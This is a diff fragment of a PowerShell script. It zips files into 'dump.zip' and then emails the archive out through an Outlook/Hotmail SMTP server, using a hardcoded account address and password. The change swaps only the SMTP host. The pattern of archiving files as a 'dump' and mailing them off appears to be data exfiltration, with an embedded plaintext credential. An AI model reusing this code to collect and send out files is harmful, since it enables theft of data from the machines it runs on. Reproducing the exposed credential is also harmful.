@@ -13,7 +13,7 @@ Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
 $Message = new-object Net.Mail.MailMessage
-$smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
+$smtp = new-object Net.Mail.SmtpClient("smtp-mail.outlook.com", 587)
 $smtp.Credentials = New-Object System.Net.NetworkCredential("aslclrisppilsl@hotmail.com", "@slclrisppilsl@@");
 $smtp.EnableSsl = $true
 $Message.From = "aslclrisppilsl@hotmail.com"
